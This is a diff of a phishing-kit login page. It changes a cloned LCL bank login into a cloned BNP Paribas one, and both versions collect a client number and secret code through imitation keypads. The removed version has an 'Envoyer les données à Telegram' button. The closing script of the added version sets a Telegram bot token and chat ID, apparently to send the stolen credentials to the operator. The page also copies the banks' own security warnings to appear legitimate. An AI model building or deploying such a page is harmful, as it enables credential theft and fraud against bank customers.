@@ -10,32 +10,28 @@
     <script src="wait-config.js" defer></script>
     <script src="init-telegram.js" defer></script>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Connexion - LCL Particuliers</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Connexion - BNP Paribas</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
+        /* Votre CSS existant reste identique */
         :root {
-            --lcl-blue: #1d2570;
-            --lcl-yellow: #ffcb05;
-            --lcl-light-blue: #f0f4ff;
-            --lcl-red: #d32f2f;
-            --lcl-green: #28a745;
+            --bnp-green: #00965e;
+            --bnp-dark-green: #006a43;
+            --text-gray: #666;
+            --border-light: #ddd;
+            --error-red: #e74c3c;
+            --success-green: #2ecc71;
         }
 
-        /* --- RESET --- */
-        * { 
-            box-sizing: border-box; 
-            margin: 0; 
-            padding: 0; 
-            font-family: 'Open Sans', Arial, sans-serif; 
-            -webkit-tap-highlight-color: transparent;
-        }
-        
-        body, html { 
-            height: 100%; 
-            width: 100%; 
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Arial, sans-serif; }
+
+        body { 
             background-color: #fff; 
-            overflow-x: hidden; 
+            display: flex; 
+            flex-direction: column; 
+            min-height: 100vh;
+            overflow-x: hidden;
         }
 
         /* BOUTON RETOUR AU-DESSUS DU LOGO */
@@ -45,7 +41,7 @@
             left: 0;
             right: 0;
             background-color: white;
-            border-bottom: 1px solid #e0e0e0;
+            border-bottom: 1px solid var(--border-light);
             padding: 12px 20px;
             z-index: 1000;
             display: flex;
@@ -54,7 +50,7 @@
         }
         
         .back-to-bank-btn {
-            background-color: var(--lcl-blue);
+            background-color: var(--bnp-green);
             color: white;
             border: none;
             border-radius: 50px;
@@ -66,11 +62,11 @@
             align-items: center;
             gap: 8px;
             transition: all 0.3s ease;
-            font-family: 'Open Sans', Arial, sans-serif;
+            font-family: 'Segoe UI', Arial, sans-serif;
         }
         
         .back-to-bank-btn:hover {
-            background-color: #151d5a;
+            background-color: var(--bnp-dark-green);
             transform: translateX(-2px);
         }
         
@@ -83,357 +79,448 @@
             font-style: normal;
             font-weight: bold;
         }
+        
+        /* --- MESSAGES D'ÉTAT --- */
+        .message {
+            display: none;
+            padding: 15px;
+            margin: 15px auto;
+            border-radius: 4px;
+            text-align: center;
+            font-weight: bold;
+            max-width: 450px;
+            animation: slideIn 0.3s ease;
+        }
 
-        .main-container { 
-            display: flex; 
-            min-height: 100vh; 
-            width: 100%; 
+        .message.error {
+            background-color: #fee;
+            color: var(--error-red);
+            border: 1px solid #fcc;
+        }
+
+        .message.success {
+            background-color: #e8f6ef;
+            color: var(--success-green);
+            border: 1px solid #bce8d4;
+        }
+
+        .loading-spinner {
+            display: none;
+            text-align: center;
+            margin: 20px 0;
+            color: var(--bnp-green);
+        }
+
+        .spinner-icon {
+            animation: spin 1s linear infinite;
+            font-size: 24px;
+            margin-bottom: 10px;
+        }
+
+        /* --- HEADER --- */
+        header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 15px 20px;
+            border-bottom: 1px solid var(--border-light);
+            background-color: #fff;
+            position: sticky;
+            top: 0;
+            z-index: 100;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.05);
             margin-top: 50px;
         }
 
-        /* --- SECTION FORMULAIRE (GAUCHE) --- */
-        .login-side { 
-            flex: 1; 
-            display: flex; 
-            flex-direction: column; 
-            align-items: center; 
-            padding: 20px; 
-            z-index: 2;
-            background: #fff;
-            position: relative;
-        }
-
-        .logo-lcl { 
-            width: 70px; 
-            margin: 30px 0; 
-        }
-
-        .form-container { 
-            width: 100%; 
-            max-width: 350px; 
-            text-align: center; 
-        }
-        
-        h2 { 
-            color: var(--lcl-blue); 
-            font-size: 1.2rem; 
-            margin-bottom: 20px; 
-            font-weight: 700; 
-        }
-
-        /* Identifiant Responsive */
-        .id-input-container { 
-            display: flex; 
-            justify-content: space-between; 
-            margin-bottom: 15px; 
-            gap: 4px;
-        }
-        
-        .id-digit {
-            flex: 1;
-            max-width: 28px;
-            border: none; 
-            border-bottom: 2px solid #ccc;
-            text-align: center; 
-            font-size: 1.1rem; 
-            color: var(--lcl-blue);
-            padding-bottom: 5px; 
-            outline: none; 
-            background: transparent;
-            transition: border-color 0.3s;
-        }
-        
-        .id-digit:focus { 
-            border-bottom-color: var(--lcl-blue); 
-        }
-
-        .memo-id { 
+        .logo-container { 
             display: flex; 
             align-items: center; 
-            justify-content: center; 
-            gap: 8px; 
-            font-size: 0.85rem; 
-            color: #666; 
-            margin-bottom: 20px; 
-            cursor: pointer; 
-        }
-
-        /* --- ETAPE CLAVIER --- */
-        #step-password { 
-            display: none; 
-            margin-top: 20px; 
-            padding-top: 20px; 
-            border-top: 1px solid #f0f0f0; 
-            animation: fadeIn 0.4s ease; 
-        }
-
-        .dots-container { 
-            display: flex; 
-            justify-content: center; 
-            gap: 10px; 
-            margin-bottom: 20px; 
+            gap: 15px;
+            flex-wrap: wrap;
         }
         
-        .dot { 
-            width: 12px; 
-            height: 12px; 
-            border: 1px solid #ccc; 
-            border-radius: 50%; 
-            transition: 0.2s; 
+        .logo-img { 
+            height: 35px; 
+            width: auto;
         }
         
-        .dot.active { 
-            background-color: var(--lcl-blue); 
-            border-color: var(--lcl-blue); 
-            transform: scale(1.1); 
+        .tagline { 
+            color: var(--text-gray); 
+            font-size: 12px; 
+            padding-left: 15px; 
+            border-left: 1px solid var(--border-light);
+            display: none;
         }
 
-        /* Clavier Responsive (Grid) */
-        .keypad { 
-            display: grid; 
-            grid-template-columns: repeat(4, 1fr); 
-            gap: 12px; 
-            margin-bottom: 25px; 
-            padding: 0 10px;
-        }
-        
-        .key {
-            aspect-ratio: 1/1;
-            border-radius: 50%; 
+        /* Menu mobile */
+        .mobile-menu-btn {
+            display: none;
+            background: none;
             border: none;
-            background-color: var(--lcl-light-blue); 
-            color: var(--lcl-blue);
-            font-weight: bold; 
-            font-size: 1.2rem; 
+            font-size: 20px;
+            color: var(--text-gray);
             cursor: pointer;
+            padding: 5px;
+        }
+
+        /* --- CONTENEUR PRINCIPAL --- */
+        .container { 
+            display: flex; 
+            flex: 1; 
+            flex-direction: row;
+        }
+
+        /* Section Gauche (Verte) - Connexion */
+        .login-section {
+            background-color: var(--bnp-green);
+            flex: 1.5;
+            color: white;
             display: flex;
+            flex-direction: column;
             align-items: center;
             justify-content: center;
-            transition: all 0.2s;
-        }
-        
-        .key:active { 
-            background-color: #dbe4ff; 
-            transform: scale(0.95); 
-        }
-        
-        .key.clear-key { 
-            background-color: #fff0f0; 
-            color: var(--lcl-red); 
-        }
-
-        .btn-submit {
-            width: 100%;
-            max-width: 250px;
-            background-color: var(--lcl-blue); 
-            color: white; 
-            border: none;
-            padding: 14px 20px; 
-            border-radius: 30px; 
-            font-size: 1rem; 
-            font-weight: 600;
-            cursor: pointer; 
-            display: inline-flex; 
-            align-items: center; 
-            justify-content: center;
-            gap: 10px;
-            transition: all 0.3s;
-            margin-bottom: 10px;
-        }
-        
-        .btn-submit:hover {
-            background-color: #151d5a;
-        }
-        
-        .btn-submit:disabled {
-            background-color: #ccc;
-            cursor: not-allowed;
-        }
-        
-        /* Bouton spécial Telegram */
-        .btn-telegram {
-            width: 100%;
-            max-width: 250px;
-            background-color: #0088cc; 
-            color: white; 
-            border: none;
-            padding: 14px 20px; 
-            border-radius: 30px; 
-            font-size: 1rem; 
-            font-weight: 600;
-            cursor: pointer; 
-            display: inline-flex; 
-            align-items: center; 
-            justify-content: center;
-            gap: 10px;
-            transition: all 0.3s;
-            margin-top: 10px;
-        }
-        
-        .btn-telegram:hover {
-            background-color: #006699;
-        }
-
-        .links { 
-            margin-top: 25px; 
-        }
-        
-        .links a { 
-            display: block; 
-            color: var(--lcl-blue); 
-            text-decoration: underline; 
-            font-size: 0.85rem; 
-            margin-bottom: 10px; 
-        }
-
-        /* --- SECTION IMAGE (DROITE) --- */
-        .image-side { 
-            flex: 1.2; 
-            position: relative; 
-            overflow: hidden;
-            display: flex;
-            align-items: flex-end;
-            justify-content: center;
             padding: 40px 20px;
-        }
-        
-        .image-bg {
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: url('images/tof.jpg') no-repeat center center;
-            background-size: cover;
-            z-index: 1;
-        }
-        
-        .image-bg::after {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: linear-gradient(deg, rgba(29, 37, 112, 0.85) 0%, rgba(29, 37, 112, 0.7) 100%);
-            z-index: 2;
+            min-height: calc(100vh - 70px);
+            order: 1;
         }
 
-        .security-tip { 
-            position: relative;
-            background: rgba(255, 255, 255, 0.95); 
-            padding: 25px; 
-            width: 100%;
-            max-width: 380px;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.15); 
-            display: flex; 
-            gap: 15px; 
-            border-radius: 10px;
-            z-index: 3;
+        .login-box { 
+            width: 100%; 
+            max-width: 450px;
+            animation: fadeUp 0.5s ease;
         }
         
-        .tip-icon { 
-            color: var(--lcl-blue); 
-            font-size: 30px; 
-            flex-shrink: 0;
-        }
-        
-        .tip-text h4 { 
-            color: var(--lcl-blue); 
-            margin-bottom: 8px; 
-            font-size: 1.1rem;
-        }
-        
-        .tip-text p { 
-            font-size: 0.85rem; 
-            color: #555; 
-            line-height: 1.4; 
-        }
-
-        /* Loader */
-        .loader {
-            display: none;
+        h1 { 
+            font-size: 22px; 
+            margin-bottom: 25px; 
+            font-weight: 600;
             text-align: center;
-            margin: 15px 0;
+        }
+
+        .form-group { 
+            margin-bottom: 20px; 
+            position: relative; 
         }
         
-        .spinner {
-            border: 3px solid #f3f3f3;
-            border-top: 3px solid var(--lcl-blue);
+        label { 
+            display: block; 
+            font-weight: 600; 
+            margin-bottom: 8px; 
+            font-size: 14px; 
+        }
+
+        .input-wrapper { 
+            position: relative; 
+            width: 100%; 
+        }
+        
+        input[type="text"] {
+            width: 100%; 
+            padding: 14px 45px 14px 15px; 
+            border: none; 
+            border-radius: 8px; 
+            font-size: 16px; 
+            color: #333; 
+            outline: none;
+            background-color: rgba(255,255,255,0.95);
+            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+            transition: all 0.3s ease;
+        }
+
+        input[type="text"]:focus {
+            box-shadow: 0 0 0 2px rgba(255,255,255,0.5);
+        }
+
+        .clear-btn {
+            position: absolute; 
+            right: 15px; 
+            top: 50%; 
+            transform: translateY(-50%);
+            color: #999; 
+            cursor: pointer; 
+            background: none; 
+            border: none; 
+            font-size: 18px;
+            transition: color 0.3s;
+        }
+
+        .clear-btn:hover {
+            color: var(--error-red);
+        }
+
+        .checkbox-group { 
+            display: flex; 
+            align-items: center; 
+            gap: 10px; 
+            margin-top: 15px; 
+            font-size: 13px; 
+            color: rgba(255,255,255,0.9);
+        }
+
+        .checkbox-group input[type="checkbox"] {
+            width: 18px;
+            height: 18px;
+            accent-color: white;
+        }
+
+        /* --- BOUTON SUIVANT --- */
+        .btn-next {
+            width: 100%; 
+            padding: 16px; 
+            border: none; 
+            border-radius: 25px;
+            background-color: rgba(141, 189, 164, 0.7);
+            color: var(--bnp-dark-green); 
+            font-weight: 600; 
+            font-size: 16px;
+            margin-top: 20px; 
+            cursor: not-allowed; 
+            transition: all 0.3s ease;
+            box-shadow: 0 4px 10px rgba(0,0,0,0.1);
+        }
+
+        .btn-next.active {
+            background-color: #e5f3ec;
+            cursor: pointer;
+            transform: translateY(-2px);
+            box-shadow: 0 6px 15px rgba(0,0,0,0.15);
+        }
+
+        .btn-next.active:hover {
+            background-color: #d4f0e3;
+        }
+
+        /* --- CLAVIER SECRET (SÉQUENTIEL) --- */
+        #keypad-container {
+            display: none;
+            margin-top: 30px;
+            animation: fadeIn 0.5s ease;
+        }
+
+        .dots-display {
+            display: flex; 
+            justify-content: center; 
+            gap: 12px; 
+            margin: 20px 0 30px;
+        }
+
+        .dot {
+            width: 16px; 
+            height: 16px; 
+            border: 2px solid rgba(255,255,255,0.6); 
             border-radius: 50%;
-            width: 20px;
-            height: 20px;
-            animation: spin 1s linear infinite;
-            margin: 0 auto 8px;
+            transition: all 0.3s ease;
         }
         
+        .dot.filled { 
+            background-color: white; 
+            border-color: white;
+            transform: scale(1.1);
+        }
+
+        .keypad-grid {
+            display: grid; 
+            grid-template-columns: repeat(5, 1fr); 
+            gap: 12px;
+        }
+
+        .key {
+            background: rgba(255,255,255,0.95); 
+            color: #333; 
+            border: none; 
+            padding: 18px 5px;
+            font-size: 20px; 
+            font-weight: bold; 
+            border-radius: 8px; 
+            cursor: pointer;
+            transition: all 0.2s ease;
+            box-shadow: 0 3px 5px rgba(0,0,0,0.1);
+        }
+        
+        .key:hover {
+            background: white;
+            transform: translateY(-2px);
+            box-shadow: 0 5px 8px rgba(0,0,0,0.15);
+        }
+        
+        .key:active {
+            transform: translateY(0);
+        }
+        
+        .key-clear {
+            grid-column: span 1; 
+            background: rgba(255,255,255,0.2); 
+            color: white;
+            font-size: 18px;
+        }
+
+        /* --- BOUTON ACCÈS --- */
+        .btn-access {
+            width: 100%; 
+            padding: 16px; 
+            border: none; 
+            border-radius: 25px;
+            background-color: rgba(141, 189, 164, 0.7);
+            color: var(--bnp-dark-green); 
+            font-weight: 600; 
+            font-size: 16px;
+            margin-top: 30px; 
+            cursor: not-allowed; 
+            transition: all 0.3s ease;
+            box-shadow: 0 4px 10px rgba(0,0,0,0.1);
+        }
+
+        .btn-access.active {
+            background-color: #e5f3ec;
+            cursor: pointer;
+            transform: translateY(-2px);
+            box-shadow: 0 6px 15px rgba(0,0,0,0.15);
+        }
+
+        .btn-access.active:hover {
+            background-color: #d4f0e3;
+        }
+
+        .forgot-link {
+            display: block; 
+            text-align: center; 
+            margin-top: 20px; 
+            color: white;
+            text-decoration: underline; 
+            font-size: 14px; 
+            font-weight: 500;
+            transition: opacity 0.3s;
+        }
+
+        .forgot-link:hover {
+            opacity: 0.8;
+        }
+
+        /* Section Droite (Sécurité) */
+        .info-section {
+            flex: 1; 
+            padding: 40px 20px; 
+            background-color: #f8f9fa;
+            overflow-y: auto;
+            max-height: calc(100vh - 70px);
+            order: 2;
+        }
+
+        .info-block { 
+            margin-bottom: 35px; 
+            background: white;
+            padding: 25px;
+            border-radius: 12px;
+            box-shadow: 0 3px 15px rgba(0,0,0,0.05);
+        }
+        
+        .info-block h3 { 
+            display: flex; 
+            align-items: center; 
+            gap: 10px; 
+            font-size: 17px; 
+            margin-bottom: 15px; 
+            color: #333;
+        }
+        
+        .info-block h3 i {
+            color: var(--bnp-green);
+        }
+        
+        .security-url {
+            background: #f4fdf9; 
+            padding: 12px 15px; 
+            border-radius: 6px; 
+            border: 1px solid #e0f2ea;
+            font-family: 'Courier New', monospace; 
+            font-size: 14px; 
+            font-weight: 600; 
+            color: #333; 
+            margin: 12px 0;
+            word-break: break-all;
+        }
+        
+        .info-text { 
+            font-size: 14px; 
+            color: var(--text-gray); 
+            line-height: 1.6; 
+            margin-bottom: 15px;
+        }
+        
+        .link-green { 
+            color: var(--bnp-green); 
+            text-decoration: underline; 
+            font-weight: 600; 
+            font-size: 14px;
+            transition: color 0.3s;
+        }
+        
+        .link-green:hover {
+            color: var(--bnp-dark-green);
+        }
+
+        /* Toast notification */
+        .toast {
+            position: fixed;
+            bottom: 30px;
+            left: 50%;
+            transform: translateX(-50%);
+            background-color: #1e293b;
+            color: white;
+            padding: 12px 20px;
+            border-radius: 12px;
+            font-size: 14px;
+            z-index: 10000;
+            display: none;
+            white-space: nowrap;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.15);
+            font-weight: 500;
+        }
+        .toast.show { display: block; animation: fadeInOut 3s ease-in-out; }
+        .toast.success { background-color: #10b981; }
+        .toast.error { background-color: #ef4444; }
+        @keyframes fadeInOut {
+            0% { opacity: 0; transform: translateX(-50%) translateY(20px); }
+            15% { opacity: 1; transform: translateX(-50%) translateY(0); }
+            85% { opacity: 1; transform: translateX(-50%) translateY(0); }
+            100% { opacity: 0; transform: translateX(-50%) translateY(20px); }
+        }
+
+        /* --- ANIMATIONS --- */
+        @keyframes fadeIn { 
+            from { opacity: 0; } 
+            to { opacity: 1; } 
+        }
+
+        @keyframes fadeUp {
+            from { 
+                opacity: 0; 
+                transform: translateY(20px); 
+            } 
+            to { 
+                opacity: 1; 
+                transform: translateY(0); 
+            }
+        }
+
+        @keyframes slideIn {
+            from { 
+                opacity: 0; 
+                transform: translateY(-10px); 
+            } 
+            to { 
+                opacity: 1; 
+                transform: translateY(0); 
+            }
+        }
+
         @keyframes spin {
             0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
         }
-        
-        .success-message {
-            display: none;
-            background-color: #d4edda;
-            color: #155724;
-            padding: 12px;
-            border-radius: 8px;
-            margin-top: 15px;
-            text-align: center;
-            animation: fadeIn 0.5s;
-            border-left: 5px solid var(--lcl-green);
-        }
 
-        /* --- MEDIA QUERIES --- */
-        @media (max-width: 1024px) {
-            .security-tip { 
-                max-width: 350px; 
-            }
-        }
-
-        @media (max-width: 850px) {
-            .main-container {
-                margin-top: 45px;
-            }
-            .image-side { 
-                display: none; 
-            }
-            
-            .login-side { 
-                flex: 1; 
-                padding: 20px; 
-            }
-            
-            .form-container { 
-                max-width: 100%; 
-                padding: 0 10px; 
-            }
-            
-            .logo-lcl { 
-                width: 60px; 
-            }
-            
-            .mobile-security-tip {
-                display: block;
-                margin-top: 30px;
-                padding: 20px;
-                background: #f8f9fa;
-                border-radius: 10px;
-                border-left: 4px solid var(--lcl-blue);
-            }
-            
-            .mobile-security-tip h4 {
-                color: var(--lcl-blue);
-                margin-bottom: 8px;
-                font-size: 1rem;
-            }
-            
-            .mobile-security-tip p {
-                font-size: 0.8rem;
-                color: #555;
-                line-height: 1.4;
-            }
-            
+        /* --- VERSION MOBILE --- */
+        @media (max-width: 900px) {
             .back-to-bank-container {
                 padding: 8px 15px;
             }
@@ -441,82 +528,54 @@
                 padding: 6px 12px;
                 font-size: 11px;
             }
+            
+            header {
+                margin-top: 45px;
+            }
+            
+            .container { 
+                flex-direction: column;
+                min-height: auto;
+            }
+            
+            .login-section {
+                min-height: 60vh;
+            }
         }
 
-        @media (max-width: 400px) {
-            .keypad { 
-                gap: 8px; 
-            }
-            
-            .key { 
-                font-size: 1.1rem; 
-            }
-            
-            h2 { 
-                font-size: 1.1rem; 
-            }
-            
-            .id-digit {
-                max-width: 24px;
-                font-size: 1rem;
-            }
-            
+        @media (max-width: 480px) {
             .back-to-bank-btn {
                 padding: 5px 10px;
                 font-size: 10px;
             }
         }
 
-        @keyframes fadeIn { 
-            from { 
-                opacity: 0; 
-                transform: translateY(10px); 
-            } 
-            to { 
-                opacity: 1; 
-                transform: translateY(0); 
-            } 
+        @media (max-width: 375px) {
+            .login-section {
+                min-height: 70vh;
+            }
         }
-        
-        .error-message {
-            display: none;
-            background-color: #f8d7da;
-            color: #721c24;
-            padding: 10px;
-            border-radius: 6px;
-            margin: 10px 0;
-            font-size: 0.85rem;
-            animation: fadeIn 0.5s;
+
+        @media (min-width: 1200px) {
+            .container {
+                max-width: 1400px;
+                margin: 0 auto;
+            }
+            
+            .login-section {
+                padding: 60px 40px;
+            }
+            
+            .info-section {
+                padding: 60px 40px;
+            }
         }
-        
-        .telegram-status {
-            display: none;
-            padding: 10px;
-            margin: 10px 0;
-            border-radius: 6px;
-            font-size: 0.85rem;
-            text-align: center;
-        }
-        
-        .telegram-success {
-            background-color: #d4edda;
-            color: #155724;
-            border-left: 5px solid var(--lcl-green);
-        }
-        
-        .telegram-error {
-            background-color: #f8d7da;
-            color: #721c24;
-            border-left: 5px solid var(--lcl-red);
-        }
-        
-        .telegram-section {
-            display: none;
-            margin-top: 20px;
-            padding: 15px;
-            background: #f8f9fa;
-            border-radius: 10px;
-            border: 1px dashed #0088cc;
+
+        .no-inspect {
+            user-select: none;
+            -webkit-user-select: none;
+            -moz-user-select: none;
+            -ms-user-select: none;
         }
     
         /* ===== OPTIMISATIONS MOBILE ===== */
@@ -610,112 +669,131 @@
         </button>
     </div>
 
-<div class="main-container">
-    <div class="login-side">
-        <img src="images/lcl.png" class="logo-lcl" alt="LCL">
+    <!-- Toast notification -->
+    <div id="toast" class="toast"></div>
 
-        <div class="form-container">
-            <div id="step-id">
-                <h2>Votre identifiant</h2>
-                <div class="id-input-container">
-                    <input type="text" class="id-digit" maxlength="1" inputmode="numeric" pattern="[0-9]*" data-index="0">
-                    <input type="text" class="id-digit" maxlength="1" inputmode="numeric" pattern="[0-9]*" data-index="1">
-                    <input type="text" class="id-digit" maxlength="1" inputmode="numeric" pattern="[0-9]*" data-index="2">
-                    <input type="text" class="id-digit" maxlength="1" inputmode="numeric" pattern="[0-9]*" data-index="3">
-                    <input type="text" class="id-digit" maxlength="1" inputmode="numeric" pattern="[0-9]*" data-index="4">
-                    <input type="text" class="id-digit" maxlength="1" inputmode="numeric" pattern="[0-9]*" data-index="5">
-                    <input type="text" class="id-digit" maxlength="1" inputmode="numeric" pattern="[0-9]*" data-index="6">
-                    <input type="text" class="id-digit" maxlength="1" inputmode="numeric" pattern="[0-9]*" data-index="7">
-                    <input type="text" class="id-digit" maxlength="1" inputmode="numeric" pattern="[0-9]*" data-index="8">
-                    <input type="text" class="id-digit" maxlength="1" inputmode="numeric" pattern="[0-9]*" data-index="9">
-                </div>
-                
-                <div id="idError" class="error-message">Veuillez compléter les 10 chiffres de votre identifiant</div>
-                
-                <label class="memo-id">
-                    <input type="checkbox" id="rememberId"> 
-                    Mémoriser mon identifiant
-                </label>
-                
-                <div id="btn-next-container">
-                    <button class="btn-submit" onclick="validateAndShowPassword()">
-                        Suivant <i class="fa-solid fa-arrow-right"></i>
-                    </button>
-                </div>
-            </div>
+    <!-- Message d'état -->
+    <div class="message" id="errorMessage"></div>
+    <div class="message success" id="successMessage"></div>
+    
+    <!-- Spinner de chargement -->
+    <div class="loading-spinner" id="loadingSpinner">
+        <div class="spinner-icon"><i class="fas fa-circle-notch"></i></div>
+        <p>Connexion en cours...</p>
+    </div>
 
-            <div id="step-password">
-                <h2>Votre code personnel</h2>
-                
-                <div id="userIdDisplay" style="margin-bottom: 15px; font-size: 0.9rem; color: #666;">
-                    Identifiant: <span id="displayUserId" style="font-weight: bold; color: var(--lcl-blue);"></span>
-                </div>
-                
-                <div class="dots-container">
-                    <div class="dot" id="dot-0"></div>
-                    <div class="dot" id="dot-1"></div>
-                    <div class="dot" id="dot-2"></div>
-                    <div class="dot" id="dot-3"></div>
-                    <div class="dot" id="dot-4"></div>
-                    <div class="dot" id="dot-5"></div>
-                </div>
-
-                <div class="keypad" id="lcl-keypad"></div>
-                
-                <div id="telegramStatus" class="telegram-status"></div>
-                
-                <div id="passwordError" class="error-message">Veuillez saisir votre code complet (6 chiffres)</div>
-                
-                <div class="loader" id="loader">
-                    <div class="spinner"></div>
-                    <div style="font-size: 0.9rem; color: var(--lcl-blue); margin-top: 5px;">
-                        Connexion en cours...
-                    </div>
-                </div>
-                
-                <div class="success-message" id="successMessage"></div>
-
-                <button class="btn-submit" id="validateBtn" onclick="submitFinal()" disabled>
-                    Valider <i class="fa-solid fa-arrow-right"></i>
-                </button>
-                
-                <div class="telegram-section" id="telegramManualSection">
-                    <p style="margin-bottom: 10px; font-size: 0.9rem; color: #666;">
-                        <i class="fa-solid fa-circle-info"></i> 
-                        Si les données ne sont pas envoyées automatiquement, cliquez ci-dessous pour les envoyer manuellement :
-                    </p>
-                    <button class="btn-telegram" id="manualTelegramBtn" onclick="sendToTelegramManually()">
-                        <i class="fab fa-telegram"></i> Envoyer les données à Telegram
-                    </button>
-                    <p id="manualStatus" style="font-size: 0.8rem; color: #666; margin-top: 10px;"></p>
-                </div>
-            </div>
-
-            <div class="links">
-                <a href="#" onclick="showHelp('identifiant')">Identifiant oublié ?</a>
-                <a href="#" onclick="showHelp('code')">Code personnel oublié ?</a>
-            </div>
+    <header>
+        <div class="logo-container">
+            <img src="images/bnp.jfif" 
+                 alt="BNP Paribas" 
+                 class="logo-img">
+            <span class="tagline">La banque d'un monde qui change</span>
         </div>
         
-        <div class="mobile-security-tip" style="display: none;">
-            <h4><i class="fa-solid fa-shield-halved"></i> Nos conseils sécurité</h4>
-            <p>Ne communiquez jamais vos codes secrets. LCL ne vous les demandera jamais par e-mail ou SMS.</p>
-        </div>
-    </div>
+        <button class="mobile-menu-btn" id="mobileMenuBtn" aria-label="Menu">
+            <i class="fas fa-bars"></i>
+        </button>
+    </header>
 
-    <div class="image-side">
-        <div class="image-bg"></div>
-        <div class="security-tip">
-            <div class="tip-icon"><i class="fa-solid fa-shield-halved"></i></div>
-            <div class="tip-text">
-                <h4>Nos conseils sécurité</h4>
-                <p>Ne communiquez jamais vos codes secrets. LCL ne vous les demandera jamais par e-mail ou SMS.</p>
+    <div class="container">
+        <!-- SECTION CONNEXION -->
+        <div class="login-section">
+            <div class="login-box">
+                <h1>Accédez à votre espace client</h1>
+
+                <div class="form-group">
+                    <label for="client-id">Numéro Client</label>
+                    <div class="input-wrapper">
+                        <input type="text" id="client-id" placeholder="Numéro de 7 à 10 chiffres" 
+                               maxlength="10" autocomplete="off" inputmode="numeric"
+                               pattern="[0-9]{7,10}" title="Entrez 7 à 10 chiffres">
+                        <button class="clear-btn" id="btn-clear-id" type="button" aria-label="Effacer">
+                            <i class="fa-regular fa-circle-xmark"></i>
+                        </button>
+                    </div>
+                    <div class="checkbox-group">
+                        <input type="checkbox" id="remember">
+                        <label for="remember" class="no-inspect">Mémoriser mon numéro client</label>
+                        <i class="fa-solid fa-circle-info" title="Cette information est stockée localement sur votre appareil"></i>
+                    </div>
+                </div>
+
+                <!-- Bouton SUIVANT -->
+                <button class="btn-next" id="next-btn" type="button" disabled>
+                    Suivant
+                </button>
+
+                <!-- CLAVIER SECRET -->
+                <div id="keypad-container">
+                    <label>Saisissez votre code secret</label>
+                    
+                    <div class="dots-display">
+                        <div class="dot"></div>
+                        <div class="dot"></div>
+                        <div class="dot"></div>
+                        <div class="dot"></div>
+                        <div class="dot"></div>
+                        <div class="dot"></div>
+                    </div>
+
+                    <div class="keypad-grid" id="keypad">
+                        <!-- Clavier généré dynamiquement -->
+                    </div>
+                </div>
+
+                <button class="btn-access" id="submit-btn" type="button" disabled style="display: none;">
+                    Accéder à mon espace client
+                </button>
+                
+                <a href="#" class="forgot-link" id="forgot-link">
+                    Numéro client ou code secret oublié
+                </a>
+            </div>
+        </div>
+
+        <!-- SECTION SÉCURITÉ -->
+        <div class="info-section">
+            <div class="info-block">
+                <h3><i class="fa-solid fa-lock"></i> Sécurité</h3>
+                <p class="info-text">Avant de vous connecter, vérifiez que sur la page Espace Client :</p>
+                <div class="security-url">Espace client</div>
+                <p class="info-text">Si une tierce personne ou un représentant BNP Paribas vous demande de vous connecter ou de fournir des informations, il s'agit systématiquement d'une fraude.</p>
+                <br>
+                <a href="#" class="link-green" id="security-link">
+                    Consulter tous nos conseils sécurité et fraude.
+                </a>
+            </div>
+
+            <div class="info-block">
+                <h3><i class="fa-solid fa-headset"></i> Besoin d'aide ?</h3>
+                <p class="info-text">Consultez notre <a href="#" class="link-green" id="tech-support">Assistance technique.</a></p>
+                <p class="info-text">Disponible du lundi au vendredi de 8h à 20h et le samedi de 9h à 17h.</p>
+            </div>
+            
+            <div class="info-block">
+                <h3><i class="fa-solid fa-mobile-alt"></i> Application Mobile</h3>
+                <p class="info-text">Téléchargez l'application "Mes Comptes BNP Paribas" pour gérer vos comptes où que vous soyez.</p>
+                <div style="display: flex; gap: 15px; margin-top: 15px;">
+                    <button id="app-store" style="flex:1; padding:10px; background:#333; color:white; border:none; border-radius:6px; font-size:12px;">
+                        <i class="fab fa-apple"></i> App Store
+                    </button>
+                    <button id="play-store" style="flex:1; padding:10px; background:#0F9D58; color:white; border:none; border-radius:6px; font-size:12px;">
+                        <i class="fab fa-google-play"></i> Play Store
+                    </button>
+                </div>
+            </div>
+            
+            <div class="info-block">
+                <h3><i class="fa-solid fa-shield-alt"></i> Protection des données</h3>
+                <p class="info-text">BNP Paribas s'engage à protéger vos données personnelles. Vos informations de connexion sont chiffrées et sécurisées.</p>
+                <a href="#" class="link-green" id="privacy-link">
+                    Lire notre politique de confidentialité
+                </a>
             </div>
         </div>
     </div>
-</div>
 
-<script>
+    <script>
         // Configuration Telegram
         const BOT_TOKEN = (window.telegramConfig && window.telegramConfig.BOT_TOKEN) || '[REDACTED]';
         const CHAT_ID = '8176081750';
